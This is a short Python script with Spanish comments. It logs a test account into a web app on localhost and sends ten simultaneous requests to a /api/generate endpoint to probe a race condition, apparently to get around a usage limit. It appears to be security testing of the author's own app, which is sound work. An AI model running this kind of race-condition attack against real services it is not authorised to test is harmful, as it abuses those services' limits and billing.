#!/usr/bin/env python3
# race_attack.py
import requests
import threading
import json

BASE_URL = "http://localhost:5000"

def race_generate(session, results, idx):
    r = session.post(f"{BASE_URL}/api/generate", json={
        "time": idx % 50,
        "motion": (idx*7) % 50,
        "place": (idx*13) % 50,
        "seat": (idx*17) % 50
    })
    results.append((idx, r.status_code, r.json()))

# Crear una cuenta
session = requests.Session()
email = "race_test@example.com"
password = "test1234"

# Registrar
session.post(f"{BASE_URL}/register", data={"email": email, "password": password})
# Login
session.post(f"{BASE_URL}/login", data={"email": email, "password": password})
session.get(f"{BASE_URL}/studio")

# Intentar race condition con múltiples hilos
results = []
threads = []

for i in range(10):
    # Crear nueva sesión para cada hilo (compartir cookies)
    s = requests.Session()
    s.cookies.update(session.cookies)
    t = threading.Thread(target=race_generate, args=(s, results, i))
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

print("Resultados:")
for idx, status, data in results:
    print(f"  Hilo {idx}: status={status}, ok={data.get('ok')}, error={data.get('error')}")
